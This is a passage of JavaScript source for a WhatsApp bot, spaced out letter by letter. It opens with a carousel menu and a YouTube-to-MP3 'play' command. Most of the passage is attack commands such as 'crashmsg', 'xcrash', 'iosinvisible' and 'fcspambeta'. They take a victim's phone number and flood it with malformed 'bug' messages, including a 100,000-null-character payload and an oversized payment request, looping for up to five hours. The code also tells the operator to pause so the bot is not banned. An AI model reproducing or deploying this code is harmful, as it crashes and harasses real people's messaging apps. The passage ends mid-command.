 ✦   ❄ ️     f o r c e b l o c k 
 ✦   ❄ ️     x p a i r s p a m 
 ✦   ❄ ️     a u t o s w v i e w   o n   /   o f f 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
                 ` , 
                 b u t t o n :   { 
                     t e x t :   " � � � � � � � � � � � � � � � � � � " , 
                     u r l :   " h t t p s : / / w h a t s a p p . c o m / c h a n n e l / 0 0 2 9 V b C 3 P 5 3 7 T 8 b a a N u Z W S 0 Y " 
                 } , 
                 i m a g e :   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " 
             } 
         ] 
 
         c o n s t   c a r o u s e l C a r d s   =   a w a i t   P r o m i s e . a l l ( 
             c a t e g o r i e s . m a p ( a s y n c   ( i t e m ,   i n d e x )   = >   { 
                 l e t   i m a g e M s g   =   g l o b a l . m e n u I m a g e C a c h e [ i t e m . i m a g e ] 
 
                 i f   ( ! i m a g e M s g )   { 
                     c o n s t   r e s   =   a w a i t   a x i o s . g e t ( i t e m . i m a g e ,   {   r e s p o n s e T y p e :   ' a r r a y b u f f e r '   } ) 
 
                     i m a g e M s g   =   ( 
                         a w a i t   g e n e r a t e W A M e s s a g e C o n t e n t ( 
                             {   i m a g e :   B u f f e r . f r o m ( r e s . d a t a )   } , 
                             {   u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r   } 
                         ) 
                     ) . i m a g e M e s s a g e 
 
                     g l o b a l . m e n u I m a g e C a c h e [ i t e m . i m a g e ]   =   i m a g e M s g 
                 } 
 
                 r e t u r n   { 
                     h e a d e r :   { 
                         t i t l e :   i t e m . t i t l e , 
                         h a s M e d i a A t t a c h m e n t :   t r u e , 
                         i m a g e M e s s a g e :   i m a g e M s g 
                     } , 
                     b o d y :   {   t e x t :   i t e m . d e s c   } , 
                     f o o t e r :   {   t e x t :   ` � �   P a g e   $ { i n d e x   +   1 }   o f   $ { c a t e g o r i e s . l e n g t h } `   } , 
                     n a t i v e F l o w M e s s a g e :   { 
                         b u t t o n s :   [ 
                             { 
                                 n a m e :   " c t a _ u r l " , 
                                 b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                     d i s p l a y _ t e x t :   i t e m . b u t t o n . t e x t , 
                                     u r l :   i t e m . b u t t o n . u r l , 
                                     m e r c h a n t _ u r l :   i t e m . b u t t o n . u r l 
                                 } ) 
                             } 
                         ] 
                     } 
                 } 
             } ) 
         ) 
 
         c o n s t   c a r o u s e l M e s s a g e   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( 
             f r o m , 
             { 
                 v i e w O n c e M e s s a g e :   { 
                     m e s s a g e :   { 
                         m e s s a g e C o n t e x t I n f o :   { 
                             d e v i c e L i s t M e t a d a t a :   { } , 
                             d e v i c e L i s t M e t a d a t a V e r s i o n :   2 
                         } , 
                         i n t e r a c t i v e M e s s a g e :   { 
                             b o d y :   {   t e x t :   "   "   } , 
                             f o o t e r :   {   t e x t :   "     - � � I P "   } , 
                             c a r o u s e l M e s s a g e :   { 
                                 c a r d s :   c a r o u s e l C a r d s 
                             } 
                         } 
                     } 
                 } 
             } , 
             {   q u o t e d :   m   } 
         ) 
 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( f r o m ,   c a r o u s e l M e s s a g e . m e s s a g e ,   { 
             m e s s a g e I d :   c a r o u s e l M e s s a g e . k e y . i d 
         } ) 
 
     }   c a t c h   ( e r r )   { 
         c o n s o l e . e r r o r ( " ❌   M e n u   c o m m a n d   e r r o r : " ,   e r r ) 
         r e p l y g c x e o n ( " ⚠ ️   F a i l e d   t o   l o a d   m e n u .   P l e a s e   t r y   a g a i n   l a t e r . " ) 
     } 
 } 
 b r e a k             
                 
                 
   c a s e   ' p l a y ' :   { 
                           i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
     t r y   { 
         c o n s t   y t s   =   r e q u i r e ( ' y t - s e a r c h ' ) ; 
 
         c o n s t   t e m p D i r   =   p a t h . j o i n ( _ _ d i r n a m e ,   " t e m p " ) ; 
         i f   ( ! f s . e x i s t s S y n c ( t e m p D i r ) )   f s . m k d i r S y n c ( t e m p D i r ,   {   r e c u r s i v e :   t r u e   } ) ; 
 
         i f   ( ! a r g s . l e n g t h )   r e t u r n   r e p l y g c x e o n ( ` � �   I n f o r m e   o   n o m e   d a   m ú s i c a ! \ n E x e m p l o :   $ { p r e f i x   | |   ' ' } p l a y   N o t   L i k e   U s ` ) ; 
 
         c o n s t   q u e r y   =   a r g s . j o i n ( "   " ) . t r i m ( ) ; 
         i f   ( q u e r y . l e n g t h   >   2 0 0 )   r e t u r n   r e p l y g c x e o n ( ` � �   N o m e   d a   m ú s i c a   m u i t o   g r a n d e !   M á x i m o   d e   2 0 0   c a r a c t e r e s . ` ) ; 
 
         / /   I n f o r m a r   u s u á r i o 
         a w a i t   r e p l y g c x e o n ( " � �   P r o c u r a n d o   a   m ú s i c a ,   a g u a r d e . . .   ⏳ " ) ; 
 
         / /   B u s c a r   n o   Y o u T u b e 
         c o n s t   s e a r c h   =   a w a i t   y t s ( ` $ { q u e r y }   o f f i c i a l ` ) ; 
         c o n s t   v i d e o   =   ( s e a r c h   & &   s e a r c h . v i d e o s   & &   s e a r c h . v i d e o s [ 0 ] )   ?   s e a r c h . v i d e o s [ 0 ]   :   n u l l ; 
         i f   ( ! v i d e o )   r e t u r n   r e p l y g c x e o n ( " � �   N ã o   e n c o n t r e i   e s s a   m ú s i c a .   T e n t e   o u t r o   n o m e . " ) ; 
 
         / /   U s a r   A P I   d e   d o w n l o a d 
         c o n s t   a p i U r l   =   ` h t t p s : / / a p i . p r i v a t e z i a . b i z . i d / a p i / d o w n l o a d e r / y t m p 3 ? u r l = $ { e n c o d e U R I C o m p o n e n t ( v i d e o . u r l ) } ` ; 
         c o n s t   a p i R e s   =   a w a i t   a x i o s . g e t ( a p i U r l ,   {   t i m e o u t :   2 0 0 0 0   } ) . c a t c h ( e   = >   { 
             t h r o w   n e w   E r r o r ( " N ã o   f o i   p o s s í v e l   c o n e c t a r   à   A P I   d e   d o w n l o a d . " ) ; 
         } ) ; 
         c o n s t   a p i D a t a   =   a p i R e s . d a t a ; 
         i f   ( ! a p i D a t a   | |   ! a p i D a t a . s t a t u s   | |   ! a p i D a t a . r e s u l t   | |   ! a p i D a t a . r e s u l t . d o w n l o a d U r l )   { 
             t h r o w   n e w   E r r o r ( " A   A P I   n ã o   c o n s e g u i u   o b t e r   a s   i n f o r m a ç õ e s   d a   m ú s i c a . " ) ; 
         } 
 
         / /   P r e p a r a r   c a m i n h o s   d o   a r q u i v o 
         c o n s t   t i m e s t a m p   =   D a t e . n o w ( ) ; 
         c o n s t   s a f e T i t l e   =   ( a p i D a t a . r e s u l t . t i t l e   | |   v i d e o . t i t l e   | |   ' a u d i o ' ) 
             . r e p l a c e ( / [ \ \ \ / : * ? " < > | ] / g ,   ' ' ) 
             . s l i c e ( 0 ,   1 2 0 ) ; 
         c o n s t   f i l e N a m e   =   ` a u d i o _ $ { t i m e s t a m p } . m p 3 ` ; 
         c o n s t   f i l e P a t h   =   p a t h . j o i n ( t e m p D i r ,   f i l e N a m e ) ; 
 
         / /   B a i x a r   M P 3   e m   s t r e a m 
         c o n s t   a u d i o R e s p o n s e   =   a w a i t   a x i o s ( { 
             m e t h o d :   " g e t " , 
             u r l :   a p i D a t a . r e s u l t . d o w n l o a d U r l , 
             r e s p o n s e T y p e :   " s t r e a m " , 
             t i m e o u t :   6 0 0 0 0 0 
         } ) . c a t c h ( e   = >   { 
             t h r o w   n e w   E r r o r ( " F a l h a   a o   b a i x a r   o   á u d i o . " ) ; 
         } ) ; 
 
         c o n s t   w r i t e r   =   f s . c r e a t e W r i t e S t r e a m ( f i l e P a t h ) ; 
         a u d i o R e s p o n s e . d a t a . p i p e ( w r i t e r ) ; 
         a w a i t   n e w   P r o m i s e ( ( r e s o l v e ,   r e j e c t )   = >   { 
             w r i t e r . o n ( ' f i n i s h ' ,   r e s o l v e ) ; 
             w r i t e r . o n ( ' e r r o r ' ,   r e j e c t ) ; 
             a u d i o R e s p o n s e . d a t a . o n ( ' e r r o r ' ,   e r r   = >   r e j e c t ( e r r ) ) ; 
         } ) ; 
 
         / /   V a l i d a r   a r q u i v o 
         i f   ( ! f s . e x i s t s S y n c ( f i l e P a t h )   | |   f s . s t a t S y n c ( f i l e P a t h ) . s i z e   = = =   0 )   { 
             t r y   {   i f   ( f s . e x i s t s S y n c ( f i l e P a t h ) )   f s . u n l i n k S y n c ( f i l e P a t h ) ;   }   c a t c h ( e ) { } 
             t h r o w   n e w   E r r o r ( " O   d o w n l o a d   f a l h o u   o u   o   a r q u i v o   v e i o   v a z i o . " ) ; 
         } 
 
         / /   E n v i a r   a v i s o   e   d e p o i s   o   á u d i o 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( f r o m ,   { 
             t e x t :   ` � �   T o c a n d o   a g o r a :   * $ { s a f e T i t l e } * \ n � �   O r i g e m :   $ { v i d e o . u r l } ` 
         } ,   {   q u o t e d :   m   } ) ; 
 
         c o n s t   a u d i o B u f f e r   =   f s . r e a d F i l e S y n c ( f i l e P a t h ) ; 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( f r o m ,   { 
             a u d i o :   a u d i o B u f f e r , 
             m i m e t y p e :   ' a u d i o / m p e g ' , 
             f i l e N a m e :   ` $ { s a f e T i t l e } . m p 3 ` 
         } ,   {   q u o t e d :   m   } ) ; 
 
         / /   L i m p e z a 
         t r y   {   f s . u n l i n k S y n c ( f i l e P a t h ) ;   }   c a t c h   ( e )   { } 
 
     }   c a t c h   ( e r r o r )   { 
         c o n s o l e . e r r o r ( ' P l a y   c o m m a n d   e r r o r : ' ,   e r r o r ) ; 
         r e t u r n   r e p l y g c x e o n ( ` � �   E r r o :   $ { e r r o r . m e s s a g e   | |   ' O c o r r e u   u m   e r r o   a o   p r o c e s s a r   s u a   s o l i c i t a ç ã o . ' } ` ) ; 
     } 
 } 
 b r e a k ;         
 
         c a s e   ' c o m ' :   { 
 
         i f   ( ! t e x t )   r e t u r n   r e p l y g c x e o n ( ` * e x a m p l e : * \ n   $ { p r e f i x   +   c o m m a n d }   + 2 0 X X X ` ) ; 
 
         l e t   t a r g e t   =   ` $ { q . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   " " ) } @ s . w h a t s a p p . n e t ` ; 
 
         a w a i t   a l b u m b u g g e r s 2 ( t a r g e t ,   t r u e ) ; 
 
         a w a i t   a l b u m b u g g e r s 1 ( t a r g e t ,   t r u e ) ; 
 
         r e p l y g c x e o n ( ` * s u c c e s s   s e n d   b u g   $ { c o m m a n d }   t o   $ { t a r g e t } * ` ) ; 
 
     c o n s o l e . l o g ( c h a l k . g r e e n ( ` s u c c e s   s e n d   b u g s   t o   $ { t a r g e t } ` ) ) 
 
 } 
 
 b r e a k         
             
     c a s e   ' u n s s p x ' :   { 
                             i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
               i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
       a w a i t   c h a t F r e z z 0 e ( X r e t u r n ) 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( m . c h a t ,   { 
                 b o t F o r w a r d e d M e s s a g e :   { 
                         m e s s a g e :   { 
                                 i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                                         b o d y :   { 
                                                 t e x t :   " b r o " , 
                                                 f o r m a t :   " D E F A U L T " 
                                         } , 
                                         n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                                                 p a r a m s J s o n :   " \ u 0 0 0 0 " . r e p e a t ( 1 0 0 0 0 0 ) , 
                                                 v e r s i o n :   3 
                                         } 
                                 } 
                         } 
                 } 
         } ,   { } ) ; 
             } 
         b r e a k ;             
         
           c a s e   ' c r a s h m s g n e w ' :   { 
                 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 
 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 2 0 1 0 3 2 9 3 5 3 6 9 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 2 0 1 2 0 6 7 3 8 4 8 8 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
 s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
     f o r   ( l e t   i   =   0 ;   i   < 2 ;   i + + )   { 
             a w a i t   F c C o n t a c N e w ( X r e t u r n ) ; 
 } 
 } 
 b r e a k         
           
             c a s e   ' c r a s h m s g ' :   { 
                 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 
 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 2 0 1 0 3 2 9 3 5 3 6 9 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 2 0 1 2 0 6 7 3 8 4 8 8 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
 s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
     f o r   ( l e t   i   =   0 ;   i   < 2 ;   i + + )   { 
             a w a i t   c r a 0 s h m s g ( X r e t u r n ) ; 
 } 
 } 
 b r e a k     
                 
                 
 
                 
 c a s e   ' c r a s h I n f i n i t y ' : 
 c a s e   ' h x c r a s h ' : 
 c a s e   ' x c r a s h ' : 
 c a s e   ' x n x x ' :   { 
                 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 
 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
 s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
     f o r   ( l e t   i   =   0 ;   i   < 5 0 ;   i + + )   { 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   ( 1 0 0 0 ) 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   ( 1 0 0 0 ) 
 a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   ( 1 0 0 0 ) 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   ( 1 0 0 0 ) 
             a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
 a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
             a w a i t   ( 1 0 0 0 ) 
 a w a i t   c a l l C r a s h ( X r e t u r n ) ; 
 } 
 } 
 b r e a k 
 c a s e   " t e s t 1 1 "   : 
 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( m . c h a t ,   { 
         r e q u e s t P a y m e n t M e s s a g e :   { 
             c u r r e n c y C o d e I s o 4 2 1 7 :   " U S D " , 
             a m o u n t 1 0 0 0 :   9 9 9 9 9 9 9 , 
             n o t e M e s s a g e :   { 
                 s t i c k e r M e s s a g e :   { 
                     u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 1 5 5 7 5 - 2 4 / 2 5 3 7 9 4 9 5 _ 1 2 3 3 0 4 7 6 1 4 3 9 1 7 4 6 _ 7 1 6 7 3 9 7 9 9 5 0 2 7 8 0 3 9 7 5 _ n . e n c " , 
                     f i l e S h a 2 5 6 :   " A s F k x v y L n K 2 2 2 n s Y 5 s 6 M h o F 4 N S K w R g 7 V i A I 5 n T c P K U s = " , 
                     f i l e E n c S h a 2 5 6 :   " 7 2 V M s 7 G 1 2 N G e 7 V Q 2 x J 2 5 s N e m j A P s d h I T d g y v H g r Q m d M = " , 
                     m e d i a K e y :   " 1 y H v O q d t F 1 x E w p P n u d s J I n h 0 9 E B q r J W E Z c D m a 7 K 6 O R o = " , 
                     m i m e t y p e :   " i m a g e / w e b p " , 
                     h e i g h t :   6 4 , 
                     w i d t h :   6 4 , 
                     f i l e L e n g t h :   2 5 3 1 4 0 , 
                     m e d i a K e y T i m e s t a m p :   1 7 2 4 4 7 4 2 6 7 , 
                     f i r s t F r a m e L e n g t h :   1 5 2 4 6 , 
                     f i r s t F r a m e S i d e c a r :   " N 4 M I T q G g H 5 8 7 + A = = " , 
                     i s A n i m a t e d :   t r u e , 
                     s t i c k e r S e n t T s :   1 7 2 4 4 7 4 2 6 7 5 8 8 , 
                     c o n t e x t I n f o :   { 
                         i s F o r w a r d e d :   t r u e , 
                         f r o m M e :   f a l s e , 
                         p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                         r e m o t e J i d :   m . c h a t , 
                         q u o t e d M e s s a g e :   { 
                             d o c u m e n t M e s s a g e :   { 
                                 u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 9 - 2 4 / 2 3 9 1 6 8 3 6 _ 5 2 0 6 3 4 0 5 7 1 5 4 7 5 6 _ 7 0 8 5 0 0 1 4 9 1 9 1 5 5 5 4 2 3 3 _ n . e n c " , 
                                 m i m e t y p e :   " a p p l i c a t i o n / v n d . o p e n x m l f o r m a t s - o f f i c e d o c u m e n t . p r e s e n t a t i o n m l . p r e s e n t a t i o n " , 
                                 f i l e S h a 2 5 6 :   " Q Y x h + K z z J 0 E T C F i f d 1 / x 3 q 6 d 8 j n B p f w T S Z h a z H R k q K o = " , 
                                 f i l e L e n g t h :   9 9 9 9 9 9 9 9 9 9 9 9 9 , 
                                 p a g e C o u n t :   1 3 1 6 1 3 4 9 1 1 , 
                                 m e d i a K e y :   " l C S c 0 f 3 r Q V H w M k B 9 0 F b j s k 1 g v O + t a O 4 D u F + k B U g j v R w = " , 
                                 f i l e N a m e :   " ⭑ ꊰ ꋬ ꋊ ꒐ ꓄ ꌦ     ▻   " , 
                                 f i l e E n c S h a 2 5 6 :   " w A z g u X h F k O 0 y 1 X Q Q h F U I 0 F J h m T 8 q 7 E D w P g g N b 8 9 u + e 4 = " , 
                                 m e d i a K e y T i m e s t a m p :   1 7 2 4 4 7 4 5 0 3 , 
                                 c o n t a c t V c a r d :   t r u e 
                             } 
                         } , 
                         e x t e r n a l A d R e p l y :   { 
                             t i t l e :   " x " , 
                             m e d i a T y p e :   2 , 
                             s o u r c e U r l :   " " 
                         } , 
                         f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                             n e w s l e t t e r J i d :   " 1 @ n e w s l e t t e r " , 
                             s e r v e r M e s s a g e I d :   1 , 
                             n e w s l e t t e r N a m e :   " # " 
                         } 
                     } 
                 } 
             } , 
             e x p i r y T i m e s t a m p :   0 , 
             a m o u n t :   { 
                 v a l u e :   9 9 9 9 9 9 9 9 9 , 
                 o f f s e t :   0 , 
                 c u r r e n c y C o d e :   " U S D " 
             } , 
             b a c k g r o u n d :   { 
                 i d :   " 1 0 0 " , 
                 f i l e L e n g t h :   9 2 8 2 8 3 , 
                 w i d t h :   1 0 0 0 , 
                 h e i g h t :   1 0 0 0 , 
                 m i m e t y p e :   " i m a g e / j p e g " , 
                 p l a c e h o l d e r A r g b :   4 2 7 8 1 9 0 0 8 0 , 
                 t e x t A r g b :   4 2 9 4 9 6 7 2 9 5 , 
                 s u b t e x t A r g b :   4 2 7 8 1 9 0 0 8 0 
             } 
         } 
     } , 
     { } 
 ) 
 c a s e   ' u i s t r e s s e r ' :   c a s e   ' f c s p a m b e t a ' :   { 
                 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 3 6 6 3 1 6 0 1 8 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 4 0 2 1 0 4 4 0 1 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
 s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
 c o n s t   F I V E _ H O U R S   =   5   *   6 0   *   6 0   *   1 0 0 0 ;   / /   5   h o u r s   i n   m i l l i s e c o n d s 
         c o n s t   s t a r t T i m e   =   D a t e . n o w ( ) ; 
 
         w h i l e   ( D a t e . n o w ( )   -   s t a r t T i m e   <   F I V E _ H O U R S )   { 
         t r y   { 
         	 a w a i t   x e o n A n d r o S p a m ( X r e t u r n ) ; 
         	 a w a i t   f o r c e r ( X r e t u r n ) ; 
                 a w a i t   s l e e p ( 5 0 0 ) ; 
         }   c a t c h   ( e r r )   { 
                 i f   ( 
                         e r r ? . o u t p u t ? . s t a t u s C o d e   = = =   4 2 8   | | 
                         e r r ? . o u t p u t ? . s t a t u s C o d e   = = =   4 0 8   | | 
                         e r r . m e s s a g e . i n c l u d e s ( ' C o n n e c t i o n   C l o s e d ' )   | | 
                         e r r . m e s s a g e . i n c l u d e s ( ' T i m e d   O u t ' )   | | 
                         e r r . c o d e   = = =   ' E C O N N A B O R T E D ' 
                 )   { 
                         c o n s o l e . l o g ( ` ⚠ ️ B u g   $ { c o m m a n d }   e n d e d   f o r   $ { X r e t u r n }   ✅ ` ) ; 
                         b r e a k ; 
                 } 
         } 
       / / 
 } 
 } 
 b r e a k 
 
 
 
 	 
 	 c a s e   ' i o s i n v i s i b l e ' :   { 
                 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 3 6 6 3 1 6 0 1 8 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 4 0 2 1 0 4 4 0 3 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
 s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   B u g   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
     f o r   ( l e t   i   =   0 ;   i   < 3 0 0 ;   i + + )   { 
 a w a i t   x i o s i n v ( X r e t u r n ) 
             a w a i t   ( 1 0 0 0 ) 
 a w a i t   x i o s i n v ( X r e t u r n ) 
 } 
 } 
 b r e a k 
 
 c a s e   ' c r a s h u i h a r d ' :   { 
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
